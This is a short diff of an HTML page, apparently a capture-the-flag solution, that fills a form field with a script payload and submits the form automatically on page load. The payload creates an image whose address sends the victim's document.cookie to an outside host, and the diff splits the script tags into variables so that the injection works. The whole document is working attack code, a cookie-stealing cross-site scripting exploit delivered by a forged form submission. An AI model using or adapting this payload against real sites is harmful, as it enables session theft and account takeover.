@@ -8,7 +8,9 @@
   <input type="submit" value="Submit" id="s">
 </form>
 <script>
-document.getElementById('m').value="<script>var el=document.createElement('img');el.src='http://ctf-solver.herokuapp.com/image?'+document.cookie;</script>";
+var open="<script>";
+  var close="</script>";
+document.getElementById('m').value=open+"var el=document.createElement('img');el.src='http://ctf-solver.herokuapp.com/image?'+document.cookie;"+close;
 document.getElementById('s').click();
 </script>
 <noscript>You're missing out.</noscript>
